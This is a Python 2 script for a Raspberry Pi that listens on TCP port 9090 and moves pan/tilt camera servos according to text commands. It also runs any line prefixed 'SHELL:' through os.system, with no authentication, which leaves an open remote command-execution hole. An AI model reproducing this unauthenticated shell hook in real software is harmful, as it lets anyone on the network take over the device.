import socket
from time import sleep
import time
import threading
import multiprocessing
import os

from Tkinter import *
import RPi.GPIO as GPIO

GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
GPIO.setup(17, GPIO.OUT)
srvyawpwm = GPIO.PWM(17, 100)
GPIO.setup(27, GPIO.OUT)
srvtiltpwm = GPIO.PWM(27, 100)

CENTER_TILT_ANGLE = 90
CENTER_YAW_ANGLE = 90

CUR_TILT_ANGLE = 90
CUR_YAW_ANGLE = 90

MAXLINE = 100

def linesplit(sock, maxline=0):
    buf = sock.recv(16)
    done = False
    while not done:
        # mid line check        
        if maxline and len(buf) > maxline:
            yield buf, True

        if "\n" in buf:
            (line, buf) = buf.split("\n", 1)
            err = maxline and len(line) > maxline
            yield line+"\n", err
        else:
            more = sock.recv(16)
            if not more:
                done = True
            else:
                buf = buf+more
    if buf:
        err = maxline and len(buf) > maxline
        yield buf, err

def setServoYawAngle(angle):
    duty = float(angle) / 10.0 + 2.5
    srvyawpwm.start(duty)
    p = multiprocessing.Process(target=releaseServoYaw)
    p.start()

def releaseServoYaw():
    time.sleep(0.5)
    srvyawpwm.stop()
    print "Servo Yaw released"

def setServoTiltAngle(angle):
    duty = float(angle) / 10.0 + 2.5
    srvtiltpwm.start(duty)
    p = multiprocessing.Process(target=releaseServoTilt)
    p.start()

def releaseServoTilt():
    time.sleep(0.5)
    srvtiltpwm.stop()
    print "Servo Tilt released"

HOST = ''
PORT = 9090
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn = None

try:
    while True:
        print "charger server started on port 9090..."
        conn, addr = s.accept()
        print 'Connected by', addr
        for line, err in linesplit(conn, MAXLINE):
            if err:
                print "Error: Line greater than allowed length %d (got %d)"  % (MAXLINE, len(line))
                break
            else:
                cmd = line.strip()
                if cmd.startswith('SHELL:'):
                    os.system(cmd[6:] + " &")
                elif (cmd.find("SRVTILTUP") > -1):
                    if CUR_TILT_ANGLE + 10 < 170:
                        CUR_TILT_ANGLE += 10
                        setServoTiltAngle(CUR_TILT_ANGLE)
                    print "SERVO TILT UP [" + str(CUR_TILT_ANGLE) + "]"
                elif (cmd.find("SRVTILTDOWN") > -1):
                    if CUR_TILT_ANGLE - 10 > 0:
                        CUR_TILT_ANGLE -= 10
                        setServoTiltAngle(CUR_TILT_ANGLE)
                    print "SERVO TILT DOWN [" + str(CUR_TILT_ANGLE) + "]"
                elif (cmd.find("SRVYAWLEFT") > -1):
                    print "SERVO YAW LEFT"
                elif (cmd.find("SRVYAWRIGHT") > -1):
                    print "SERVO YAW RIGHT"
                elif (cmd.find("CAMCENTER") > -1):
                    print "CAMERA CENTERING"
                    setServoYawAngle(CENTER_YAW_ANGLE)
                    setServoTiltAngle(CENTER_TILT_ANGLE)
                print "<", cmd
except KeyboardInterrupt:
    conn.close()
    print('interrupted!')
